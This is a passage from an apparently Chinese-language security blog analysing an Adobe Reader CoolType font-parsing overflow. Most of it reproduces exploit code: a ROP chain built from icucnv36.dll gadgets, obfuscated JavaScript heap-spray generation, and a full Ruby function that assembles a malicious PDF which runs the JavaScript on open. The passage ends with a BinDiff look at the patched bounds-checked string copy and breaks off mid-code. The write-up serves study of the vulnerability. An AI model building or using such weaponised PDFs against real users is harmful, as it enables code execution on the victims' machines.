<span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80aedc</span>,   <span class="comment"># lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x00000034</span>,   <span class="comment"># becomes eax</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80d585</span>,   <span class="comment"># add eax,edx / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x0000000a</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a849170</span>,   <span class="comment"># becomes eax (import for memcpy)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call memcpy</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># becomes first arg to memcpy (dst)</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># becomes second arg to memcpy (src)</span></span><br><span class="line">        <span class="number">0x00001000</span>,   <span class="comment"># becomes third arg to memcpy (length)</span></span><br><span class="line">    ].pack(<span class="string">'V*'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用于混淆js的变量名</span></span><br><span class="line">    var_unescape  = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>) <span class="comment"># rand_text_alpha()用于生成随机的字符串，同时避免生成漏洞利用中的坏字符。</span></span><br><span class="line">    var_shellcode = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_start     = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_s         = <span class="number">0x10000</span></span><br><span class="line">    var_c         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_b         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_d         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_3         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_i         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">    var_4         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    payload_buf = <span class="string">''</span></span><br><span class="line">    payload_buf &lt;&lt; stack_data           <span class="comment"># 将真正的shellcode复制到可读可写可执行内存段的ROP Chain。</span></span><br><span class="line">    payload_buf &lt;&lt; encoded_payload      <span class="comment"># 经过编码的shellcode放在ROP Chain的后面</span></span><br><span class="line"></span><br><span class="line">    escaped_payload = Rex::Text.to_unescape(payload_buf) <span class="comment"># 返回用于Javascript的unicode转义字符串</span></span><br><span class="line"></span><br><span class="line">    js = <span class="string">%Q|</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_unescape&#125;</span> = unescape;</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_shellcode&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( '<span class="subst">#&#123;escaped_payload&#125;</span>' );</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_c&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );</span></span><br><span class="line"><span class="string">while (<span class="subst">#&#123;var_c&#125;</span>.length + 20 + 8 &lt; <span class="subst">#&#123;var_s&#125;</span>) <span class="subst">#&#123;var_c&#125;</span>+=<span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> = <span class="subst">#&#123;var_c&#125;</span>.substring(0, (0x0c0c-0x24)/2);</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_shellcode&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_d&#125;</span> = <span class="subst">#&#123;var_b&#125;</span>.substring(0, <span class="subst">#&#123;var_s&#125;</span>/2);</span></span><br><span class="line"><span class="string">while(<span class="subst">#&#123;var_d&#125;</span>.length &lt; 0x80000) <span class="subst">#&#123;var_d&#125;</span> += <span class="subst">#&#123;var_d&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_3&#125;</span> = <span class="subst">#&#123;var_d&#125;</span>.substring(0, 0x80000 - (0x1020-0x08) / 2);</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_4&#125;</span> = new Array();</span></span><br><span class="line"><span class="string">for (<span class="subst">#&#123;var_i&#125;</span>=0;<span class="subst">#&#123;var_i&#125;</span>&lt;0x1f0;<span class="subst">#&#123;var_i&#125;</span>++) <span class="subst">#&#123;var_4&#125;</span>[<span class="subst">#&#123;var_i&#125;</span>]=<span class="subst">#&#123;var_3&#125;</span>+"s";</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"></span><br><span class="line">    js</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="4、make-pdf"><a href="#4、make-pdf" class="headerlink" title="4、make_pdf()"></a>4、make_pdf()</h4><p>&emsp;&emsp;此函数一步一步构造<code>pdf</code>中的每一个<code>obj</code>,将<code>ttf字体数据</code>和<code>javascript代码</code>分别放在了<code>obj10</code>和<code>obj12</code>,然后在<code>obj1</code>中设置<code>/OpenAction 11 0 R</code>,使pdf文件<code>打开</code>时,<code>javascript</code>能够被执行,从而实现<code>Heap Spary</code>。还构造了<code>obj13</code>,使<code>icucnv36.dll</code>能够被加载。因为,<code>exp</code>中使用的<code>ROPgadget</code>都是出自<code>icucnv36.dll</code>模块的,所以其必须要<code>被加载到内存</code>中。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pdf</span><span class="params">(ttf, js)</span></span></span><br><span class="line">    xref = []</span><br><span class="line">    eol = <span class="string">"\n"</span> <span class="comment"># end of line</span></span><br><span class="line">    endobj = <span class="string">"endobj"</span> &lt;&lt; eol</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Randomize PDF version?</span></span><br><span class="line">    pdf = <span class="string">"%PDF-1.5"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"%"</span> &lt;&lt; random_non_ascii_string(<span class="number">4</span>) &lt;&lt; eol     <span class="comment"># 四字节随机的非ASCII字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># catalog</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">1</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Pages "</span>) &lt;&lt; io_ref(<span class="number">2</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Catalog"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/OpenAction "</span>) &lt;&lt; io_ref(<span class="number">11</span>) &lt;&lt; eol</span><br><span class="line">    <span class="comment"># The AcroForm is required to get icucnv36.dll to load</span></span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/AcroForm "</span>) &lt;&lt; io_ref(<span class="number">13</span>) &lt;&lt; eol    <span class="comment"># /AcroForm是为了主程序能够加载icucnv36.dll</span></span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pages array</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">2</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/MediaBox "</span>) &lt;&lt; io_ref(<span class="number">3</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Resources "</span>) &lt;&lt; io_ref(<span class="number">4</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Kids ["</span>) &lt;&lt; io_ref(<span class="number">5</span>) &lt;&lt; <span class="string">"]"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Count 1"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Pages"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># media box</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">3</span>)</span><br><span class="line">    pdf &lt;&lt; <span class="string">"[0 0 595 842]"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># resources</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">4</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Font "</span>) &lt;&lt; io_ref(<span class="number">6</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># page 1</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">5</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Parent "</span>) &lt;&lt; io_ref(<span class="number">2</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/MediaBox "</span>) &lt;&lt; io_ref(<span class="number">3</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Resources "</span>) &lt;&lt; io_ref(<span class="number">4</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Contents ["</span>) &lt;&lt; io_ref(<span class="number">8</span>) &lt;&lt; n_obfu(<span class="string">"]"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Page"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol <span class="comment"># end obj dict</span></span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># font</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">6</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/F1 "</span>) &lt;&lt; io_ref(<span class="number">7</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ttf object</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">7</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Font"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Subtype /TrueType"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Name /F1"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/BaseFont /Cinema"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Widths []"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/FontDescriptor "</span>) &lt;&lt; io_ref(<span class="number">9</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Encoding /MacRomanEncoding"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># page content</span></span><br><span class="line">    content = <span class="string">"Hello World!"</span></span><br><span class="line">    content = <span class="string">""</span> +</span><br><span class="line">        <span class="string">"0 g"</span> + eol +</span><br><span class="line">        <span class="string">"BT"</span> + eol +</span><br><span class="line">        <span class="string">"/F1 32 Tf"</span> + eol +</span><br><span class="line">        <span class="string">"32 Tc"</span> + eol +</span><br><span class="line">        <span class="string">"1 0 0 1 32 773.872 Tm"</span> + eol +</span><br><span class="line">        <span class="string">"("</span> + content + <span class="string">") Tj"</span> + eol +</span><br><span class="line">        <span class="string">"ET"</span></span><br><span class="line"></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">8</span>) &lt;&lt; <span class="string">"&lt;&lt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Length %s"</span> % content.length) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; content &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># font descriptor</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">9</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type/FontDescriptor/FontName/Cinema"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Flags %d"</span> % (<span class="number">2</span>**<span class="number">2</span> + <span class="number">2</span>**<span class="number">6</span> + <span class="number">2</span>**<span class="number">17</span>))</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/FontBBox [-177 -269 1123 866]"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/FontFile2 "</span>) &lt;&lt; io_ref(<span class="number">10</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ttf stream</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    compressed = Zlib::Deflate.deflate(ttf) <span class="comment"># 字体数据是通过zlib进行压缩后放入pdf的</span></span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">10</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Length %s/Filter/FlateDecode/Length1 %s&gt;&gt;"</span> % [compressed.length, ttf.length]) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; compressed &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># js action</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">11</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type/Action/S/JavaScript/JS "</span>) + io_ref(<span class="number">12</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># js stream</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js)) <span class="comment"># javascript代码也是通过zlib进行压缩后放入pdf的</span></span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">12</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Length %s/Filter[/FlateDecode/ASCIIHexDecode]&gt;&gt;"</span> % compressed.length) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; compressed &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line">    <span class="comment"># The following form related data is required to get icucnv36.dll to load</span></span><br><span class="line">    <span class="comment"># 以下表单相关数据是为了让icucnv36.dll得到加载</span></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># form object</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">13</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/XFA "</span>) &lt;&lt; io_ref(<span class="number">14</span>) &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># form stream</span></span><br><span class="line">    xfa = <span class="string">&lt;&lt;-EOF</span></span><br><span class="line"><span class="string">    &lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">    &lt;xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"&gt;</span></span><br><span class="line"><span class="string">    &lt;config xmlns="http://www.xfa.org/schema/xci/2.6/"&gt;</span></span><br><span class="line"><span class="string">    &lt;present&gt;&lt;pdf&gt;&lt;interactive&gt;1&lt;/interactive&gt;&lt;/pdf&gt;&lt;/present&gt;</span></span><br><span class="line"><span class="string">    &lt;/config&gt;</span></span><br><span class="line"><span class="string">    &lt;template xmlns="http://www.xfa.org/schema/xfa-template/2.6/"&gt;</span></span><br><span class="line"><span class="string">    &lt;subform name="form1" layout="tb" locale="en_US"&gt;</span></span><br><span class="line"><span class="string">    &lt;pageSet&gt;&lt;/pageSet&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;&lt;/template&gt;&lt;/xdp:xdp&gt;</span></span><br><span class="line"><span class="string">    EOF</span></span><br><span class="line"></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">14</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Length %s&gt;&gt;"</span> % xfa.length) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; xfa &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line">    <span class="comment"># end form stuff for icucnv36.dll</span></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># trailing stuff</span></span><br><span class="line">    xrefPosition = pdf.length</span><br><span class="line">    pdf &lt;&lt; <span class="string">"xref"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"0 %d"</span> % (xref.length + <span class="number">1</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"0000000000 65535 f"</span> &lt;&lt; eol</span><br><span class="line">    xref.each <span class="keyword">do</span> <span class="params">|index|</span></span><br><span class="line">        pdf &lt;&lt; <span class="string">"%010d 00000 n"</span> % index &lt;&lt; eol</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    pdf &lt;&lt; <span class="string">"trailer"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Size %d/Root "</span> % (xref.length + <span class="number">1</span>)) &lt;&lt; io_ref(<span class="number">1</span>) &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line"></span><br><span class="line">    pdf &lt;&lt; <span class="string">"startxref"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; xrefPosition.to_s() &lt;&lt; eol</span><br><span class="line"></span><br><span class="line">    pdf &lt;&lt; <span class="string">"%%EOF"</span> &lt;&lt; eol</span><br><span class="line">    pdf</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><p>&emsp;&emsp;我下载了<code>Adobe Reader v9.4.0</code>版本,安装好后,提取出了其中的<code>CoolType.dll</code>模块。<code>Adobe Reader v9.3.4</code>中<code>CoolType.dll</code>的版本是<code>v5.5.72.1</code>,<code>Adobe Reader v9.4.0</code>中<code>CoolType.dll</code>的版本是<code>v5.5.73.1</code>。通过<code>BinDiff</code>进行对比后,结果如下：</p><div align="left"><img src="/resources/2018/2018-06-01-05.jpg" width="80%" height="70%" alt="BinDiff结果"></div><p>&emsp;&emsp;其中<code>strcat()</code>函数被<code>sub_813391E()</code>函数替换,我们进入sub_813391E()函数,看看是怎样验证<code>uniqueName字段</code>长度的：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sub_813391E(&amp;uniqueName_buf, (<span class="keyword">char</span> *)(v22 + <span class="number">16</span>), <span class="number">260</span>);</span><br><span class="line">sub_8001243(&amp;uniqueName_buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_813391E</span><span class="params">(<span class="keyword">char</span> *uniqueName_buf, <span class="keyword">char</span> *uniqueName_str, <span class="keyword">int</span> max_length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> len; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@2</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>(uniqueName_buf);                 <span class="comment">// 如果uniqueName_buf已经有了字符串,先计算其长度</span></span><br><span class="line">  <span class="keyword">if</span> ( max_length &gt; len )                       <span class="comment">// 判断字符串长度是否超过最大值,max_length=0x104=260</span></span><br><span class="line">    <span class="comment">// 将pdf中uniqueName字段的内容复制到缓冲区中已有的字符串之后,长度之和不能超过260字节</span></span><br><span class="line">    result = <span class="built_in">strncat</span>(&amp;uniqueName_buf[len], uniqueName_str, max_length - len - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = uniqueName_buf;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//************************************************************************************************//</span></span><br><span 